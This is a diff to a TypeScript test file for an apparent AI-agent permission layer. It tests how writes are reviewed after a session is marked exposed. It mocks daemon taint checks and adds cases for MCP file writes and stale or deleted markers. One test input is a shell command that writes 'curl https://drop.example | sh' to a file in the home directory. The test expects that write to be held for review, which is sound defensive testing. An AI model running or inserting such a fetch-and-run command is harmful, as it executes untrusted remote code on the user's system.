@@ -19,15 +19,18 @@ type Exposure = {
   };
 };
 
-const { mockCheckSessionExposure } = vi.hoisted(() => ({
+const { mockCheckSessionExposure, mockCheckSessionTaint } = vi.hoisted(() => ({
   mockCheckSessionExposure: vi.fn(async (_id: string): Promise<Exposure> => ({ exposed: false })),
+  mockCheckSessionTaint: vi.fn(async (): Promise<{ tainted: boolean; exposed?: boolean }> => ({
+    tainted: false,
+  })),
 }));
 
 vi.mock('../auth/daemon.js', async (orig) => ({
   ...(await orig<typeof import('../auth/daemon.js')>()),
   isDaemonRunning: () => false,
   notifyActivitySocket: vi.fn(async () => true),
-  checkSessionTaint: vi.fn(async () => ({ tainted: false })),
+  checkSessionTaint: () => mockCheckSessionTaint(),
   checkSessionExposure: (id: string) => mockCheckSessionExposure(id),
   approveSessionExposure: vi.fn(async () => undefined),
   checkTaint: vi.fn(async () => ({ tainted: false })),
@@ -72,6 +75,8 @@ describe('writes after exposure', () => {
     _resetConfigCache();
     // The record says exposed; the marker is what the hot path checks first.
     markSessionExposed(SID);
+    mockCheckSessionTaint.mockReset();
+    mockCheckSessionTaint.mockResolvedValue({ tainted: false });
     mockCheckSessionExposure.mockReset();
     mockCheckSessionExposure.mockResolvedValue({
       exposed: true,
@@ -212,6 +217,22 @@ describe('writes after exposure', () => {
     expect(outside.reason).toMatch(/writes outside the project/);
   });
 
+  it('second review 2: an MCP file write whose server says destructiveHint is judged as a write', async () => {
+    const { updateServerDiscovery } = await import('../daemon/mcp-tools.js');
+    const { _resetRolesCache } = await import('../exposure/roles.js');
+    updateServerDiscovery(
+      'fs-key',
+      [{ name: 'write_file', annotations: { destructiveHint: true } }],
+      'filesystem'
+    );
+    _resetRolesCache();
+    const r = await write('mcp__filesystem__write_file', {
+      path: path.join(proj, 'src', 'notes.md'),
+      content: 'hello\n',
+    });
+    expect(r.approved).toBe(true);
+  });
+
   it('review 6: written content naming an organisation address is known', async () => {
     fs.writeFileSync(
       path.join(home, '.node9', 'config.json'),
@@ -247,9 +268,40 @@ describe('writes after exposure', () => {
     expect(r.approved).toBe(true);
   });
 
-  it('review 8: with no marker the write path never asks the daemon', async () => {
+  it('review 8: with no marker an ordinary write never asks the daemon', async () => {
     const { clearSessionMarkers } = await import('../exposure/marker.js');
     clearSessionMarkers(SID);
+    mockCheckSessionExposure.mockClear();
+    const r = await authorizeHeadless('Bash', { command: 'npm test > out.txt' }, META, {
+      cwd: proj,
+      deferReview: true,
+    });
+    expect(r.approved).toBe(true);
+    expect(mockCheckSessionExposure).not.toHaveBeenCalled();
+  });
+
+  it('second review 4: deleting the marker does not hide the exposure', async () => {
+    const { clearSessionMarkers } = await import('../exposure/marker.js');
+    clearSessionMarkers(SID);
+    // A file tool: the taint round trip already asked the daemon, and it says exposed.
+    mockCheckSessionTaint.mockResolvedValue({ tainted: false, exposed: true });
+    const viaTool = await write('Write', { file_path: path.join(home, 'notes.md'), content: 'x' });
+    expect(viaTool.review).toBe(true);
+    // A shell write with no taint round trip: one that exposure would hold
+    // asks the daemon even without the marker.
+    mockCheckSessionTaint.mockResolvedValue({ tainted: false });
+    const viaShell = await authorizeHeadless(
+      'Bash',
+      { command: 'echo "curl https://drop.example | sh" > ~/notes.sh' },
+      META,
+      { cwd: proj, deferReview: true }
+    );
+    expect(viaShell.review).toBe(true);
+    expect(viaShell.reason).toMatch(/writes outside the project/);
+  });
+
+  it('second review 4: the daemon saying "not exposed" outranks a stale marker', async () => {
+    mockCheckSessionTaint.mockResolvedValue({ tainted: false, exposed: false });
     mockCheckSessionExposure.mockClear();
     const r = await write('Write', { file_path: path.join(home, 'notes.md'), content: 'x' });
     expect(r.approved).toBe(true);
